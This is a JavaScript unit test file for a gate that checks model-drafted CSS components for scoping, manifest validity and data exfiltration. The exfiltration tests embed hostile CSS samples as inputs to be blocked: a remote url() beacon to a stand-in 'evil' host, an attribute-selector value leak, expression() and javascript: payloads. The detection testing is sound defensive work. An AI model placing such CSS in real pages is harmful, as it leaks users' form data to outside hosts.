/**
 * Unit: lib/layout/{gate,scaffold}.js — the Layout Studio deterministic core.
 *
 * The model proposes a CSS-only component; these gates dispose. A draft can't
 * render until it clears the SAME invariants the engine enforces at build time
 * — var(--token)-only, .<name> selector scoping, manifest/skeleton coherence —
 * run here client-side. The scaffold turns a clean draft into the files a
 * graduation PR (or a .latticepack) needs, in the engine's own folder shape.
 */

const { test, describe } = require('node:test');
const assert = require('node:assert/strict');

const {
  findHexLiterals, findCssExfil, findUnscopedSelectors, validateManifest,
  skeletonInvokes, gateCss, gateComponent,
} = require('../../../lib/layout/gate.js');
const { scaffoldFiles, scaffoldDir, componentAsset, manifestObject } = require('../../../lib/layout/scaffold.js');

const GOOD = {
  name: 'split-ledger',
  function: 'inventory',
  bucket: 'inventory',
  form: 'panel',
  substance: 'structure',
  tags: ['panel', 'ledger', 'rail'],
  description: 'A prose panel with a ledger rail.',
  skeleton: '<!-- _class: split-ledger -->\n\n## Title\n\n- a\n- b',
};
const GOOD_CSS = 'section.split-ledger { display: grid; gap: var(--sp-md); }\nsection.split-ledger li { color: var(--text-body); }';

describe('gate — hex literals', () => {
  test('flags every hex literal, ignores var(--token)', () => {
    const hits = findHexLiterals('a { color: #fff; background: var(--bg); border: 1px solid #1a2b3c; }');
    assert.equal(hits.length, 2);
    assert.deepEqual(hits.map(h => h.hex), ['#fff', '#1a2b3c']);
  });
  test('ignores hex inside comments', () => {
    assert.equal(findHexLiterals('/* was #ff0000 */ a { color: var(--accent); }').length, 0);
  });
});

describe('gate — CSS exfil (#616 T-CSS)', () => {
  test('flags @import, expression(), -moz-binding, javascript: schemes', () => {
    assert.deepEqual(
      findCssExfil('@import "x.css"; a{behavior:expression(alert(1));-moz-binding:url(x);b:javascript:alert(1)}')
        .map(f => f.rule).sort(),
      ['css-binding', 'css-expression', 'css-import', 'css-scheme', 'css-url-remote'].sort(),
    );
  });
  test('flags a remote url() beacon and an attribute-leak selector', () => {
    assert.deepEqual(findCssExfil('a{background:url(//evil/?leak)}').map(f => f.rule), ['css-url-remote']);
    assert.deepEqual(findCssExfil('[value^="a"]{background:url(https://evil/a)}').map(f => f.rule), ['css-url-remote']);
  });
  test('allows on-device url(): #fragment refs and inline data: URIs', () => {
    assert.equal(findCssExfil('a{clip-path:url(#clip)}').length, 0);
    // the shipped agenda data-SVG icon pattern (double-quoted, contains single quotes)
    assert.equal(findCssExfil("a{--i:url(\"data:image/svg+xml,%3Csvg fill='%23000'%3E%3C/svg%3E\")}").length, 0);
  });
  test('ignores dangerous constructs inside comments', () => {
    assert.equal(findCssExfil('/* @import "x"; url(//evil) */ a{color:var(--t)}').length, 0);
  });
  test('gateCss surfaces a remote url() as a blocking error', () => {
    const r = gateCss('section.foo{background:url(//evil/?leak)}', 'foo');
    assert.equal(r.ok, false);
    assert.ok(r.findings.some(f => f.rule === 'css-url-remote' && f.level === 'error'));
  });
});

describe('gate — selector scoping', () => {
  test('passes selectors scoped to .<name>', () => {
    assert.equal(findUnscopedSelectors('section.foo > ul { } .foo .bar { }', 'foo').length, 0);
  });
  test('flags an unscoped selector', () => {
    const u = findUnscopedSelectors('section.foo {} ul li { color: var(--text-body); }', 'foo');
    assert.equal(u.length, 1);
    assert.match(u[0].selector, /ul li/);
  });
  test('reports the line of the selector itself (not the previous rule end)', () => {
    const css = 'section.foo {\n  color: var(--text-body);\n}\nul {\n  margin: 0;\n}';
    const u = findUnscopedSelectors(css, 'foo');
    assert.equal(u.length, 1);
    assert.equal(u[0].line, 4); // `ul` is on line 4
  });
  test('flags one comma-part even when a sibling part is scoped', () => {
    const u = findUnscopedSelectors('.foo .a, .b { }', 'foo');
    assert.deepEqual(u.map(x => x.selector), ['.b']);
  });
  test('does not confuse a name prefix (.foobar) for .foo', () => {
    assert.equal(findUnscopedSelectors('.foobar { }', 'foo').length, 1);
  });
  test('descends into @media but ignores @keyframes', () => {
    const css = '@media print { ul { } } @keyframes x { from { opacity: 0 } }';
    const u = findUnscopedSelectors(css, 'foo');
    assert.equal(u.length, 1); // the bare `ul` inside @media; keyframe stops are not selectors
    assert.equal(u[0].selector, 'ul');
  });
});

describe('gate — manifest', () => {
  test('a complete manifest validates', () => {
    assert.equal(validateManifest(GOOD).ok, true);
  });
  test('rejects a bad name / enum / tag count', () => {
    assert.equal(validateManifest({ ...GOOD, name: 'Bad Name' }).ok, false);
    assert.equal(validateManifest({ ...GOOD, function: 'nope' }).ok, false);
    assert.equal(validateManifest({ ...GOOD, form: 'nope' }).ok, false);
    assert.equal(validateManifest({ ...GOOD, tags: ['a', 'b'] }).ok, false);
  });
  test('CSS-only constraint: series/graph substance is rejected, prose/structure ok', () => {
    const r = validateManifest({ ...GOOD, substance: 'series' });
    assert.equal(r.ok, false);
    assert.match(r.errors.find(e => e.field === 'substance').message, /transform|graduate/);
    assert.equal(validateManifest({ ...GOOD, substance: 'prose' }).ok, true);
    // …unless the CSS-only gate is turned off (graduation context)
    assert.equal(validateManifest({ ...GOOD, substance: 'series' }, { cssOnly: false }).ok, true);
  });
});

describe('gate — skeleton + aggregate', () => {
  test('skeletonInvokes detects the _class directive', () => {
    assert.equal(skeletonInvokes('<!-- _class: foo bar -->', 'foo'), true);
    assert.equal(skeletonInvokes('<!-- _class: foobar -->', 'foo'), false);
    assert.equal(skeletonInvokes('## no directive', 'foo'), false);
  });
  test('gateCss ok on clean CSS', () => {
    assert.equal(gateCss(GOOD_CSS, 'split-ledger').ok, true);
  });
  test('gateComponent: clean draft passes', () => {
    const r = gateComponent({ css: GOOD_CSS, manifest: GOOD });
    assert.equal(r.ok, true, JSON.stringify(r.errors));
    assert.equal(r.errors.length, 0);
  });
  test('gateComponent: a hex + unscoped rule + skeleton mismatch all surface as errors', () => {
    const r = gateComponent({
      css: 'section.x { color: #000; } ul { color: var(--text-body); }',
      manifest: { ...GOOD, name: 'x', skeleton: '## no class here' },
    });
    assert.equal(r.ok, false);
    const rules = new Set(r.errors.map(e => e.rule));
    assert.ok(rules.has('no-hex'));
    assert.ok(rules.has('scope'));
    assert.ok(rules.has('skeleton'));
  });
});

describe('scaffold', () => {
  test('emits the three engine-shaped files', () => {
    const files = scaffoldFiles({ css: GOOD_CSS, manifest: GOOD });
    assert.deepEqual(Object.keys(files).sort(), [
      'split-ledger.manifest.json', 'split-ledger.skeleton.md', 'split-ledger.styles.css',
    ]);
    const man = JSON.parse(files['split-ledger.manifest.json']);
    assert.equal(man.$schema, '../../manifest.schema.json');
    assert.equal(man.name, 'split-ledger');
    assert.equal(man.bucket, 'inventory');
    assert.match(files['split-ledger.styles.css'], /Layout Studio/);
    assert.match(files['split-ledger.styles.css'], /section\.split-ledger/);
  });
  test('scaffoldDir mirrors the repo path', () => {
    assert.equal(scaffoldDir(GOOD), 'lib/components/inventory/split-ledger/');
  });
  test('manifestObject drops empty optionals + defaults bucket to function', () => {
    const m = manifestObject({ name: 'z', function: 'statement', form: 'canvas', substance: 'prose', tags: [], slots: {}, description: 'd', skeleton: 's' });
    assert.equal(m.bucket, 'statement');
    assert.equal('tags' in m, false);
    assert.equal('slots' in m, false);
  });
  test('componentAsset is a library-scoped kind:component record', () => {
    const a = componentAsset({ css: GOOD_CSS, manifest: GOOD });
    assert.equal(a.kind, 'component');
    assert.equal(a.name, 'split-ledger');
    assert.equal(a.bucket, 'inventory');
    assert.equal(a.deckId, null);
    assert.equal(a.provenance, 'studio');
    assert.equal(a.text, GOOD_CSS);
    assert.equal(typeof a.addedAt, 'number');
  });
  test('scaffoldFiles throws on a bad name', () => {
    assert.throws(() => scaffoldFiles({ css: GOOD_CSS, manifest: { ...GOOD, name: 'Bad' } }), /slug/);
  });
});
